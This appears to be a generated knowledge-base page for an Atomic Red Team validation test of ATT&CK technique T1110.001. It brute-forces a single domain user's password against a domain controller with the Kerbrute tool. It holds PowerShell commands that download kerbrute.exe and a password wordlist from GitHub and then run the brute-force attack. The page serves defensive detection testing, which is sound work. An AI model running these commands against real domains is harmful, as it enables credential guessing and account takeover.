---
atomic_guid: "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4"
title: "Password Brute User using Kerbrute Tool"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.001"
attack_technique_name: "Brute Force: Password Guessing"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4"
  - "Password Brute User using Kerbrute Tool"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Password Brute User using Kerbrute Tool

Bruteforce a single user's password from a wordlist

## Metadata

- Atomic GUID: 59dbeb1a-79a7-4c2a-baf4-46d0f4c761c4
- Technique: T1110.001: Brute Force: Password Guessing
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.001/T1110.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.001]]

## Input Arguments

### domain

- description: Domain where you will be testing
- type: string
- default: $ENV:userdomain

### domaincontroller

- description: Domain controller where test will be run
- type: string
- default: $ENV:userdnsdomain

## Dependencies

kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```text
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
```

bruteuser.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```text
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"){exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/src/bruteuser.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\bruteuser.txt"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
cd "PathToAtomicsFolder\..\ExternalPayloads"
.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.yaml)
